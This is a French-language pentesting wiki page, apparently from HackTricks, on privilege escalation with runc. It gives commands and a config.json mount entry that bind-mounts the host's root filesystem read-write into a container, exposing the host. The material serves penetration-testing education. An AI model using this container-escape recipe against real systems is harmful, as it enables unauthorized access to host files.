# RunC Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Informations de base

Si vous souhaitez en savoir plus sur **runc**, consultez la page suivante :

{{#ref}}
../../network-services-pentesting/2375-pentesting-docker.md
{{#endref}}

## PE

Si `runc` est disponible pour un processus rootful sur l’hôte, vous pouvez utiliser un bundle OCI dont la configuration de montage effectue un bind mount récursif du `/` de l’hôte vers `/` à l’intérieur du container, exposant ainsi le système de fichiers de l’hôte dans ce mount namespace.<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>
```bash
runc -help #Get help and see if runc is intalled
runc spec #This will create the config.json file in your current folder

Inside the "mounts" section of the create config.json add the following lines:
{
"type": "bind",
"source": "/",
"destination": "/",
"options": [
"rbind",
"rw",
"rprivate"
]
},

#Once you have modified the config.json file, create the folder rootfs in the same directory
mkdir rootfs

# Finally, start the container
# The root folder is the one from the host
runc run demo
```
> [!CAUTION]
> Le workflow `runc run` documenté est rootful : les propres exemples de runc le décrivent comme « run as root ». Un utilisateur non privilégié a besoin d'une configuration rootless telle que `runc spec --rootless`, et runc précise que les user namespaces doivent être activés pour ce mode.<sup>[[1]](#references)</sup>

## References

- [1] [runc : outil CLI pour créer et exécuter des containers](https://github.com/opencontainers/runc#using-runc)
- [2] [Spécification OCI du runtime : mounts](https://github.com/opencontainers/runtime-spec/blob/main/config.md#mounts)
- [3] [Shared Subtrees](https://docs.kernel.org/filesystems/sharedsubtree.html)
{{#include ../../banners/hacktricks-training.md}}
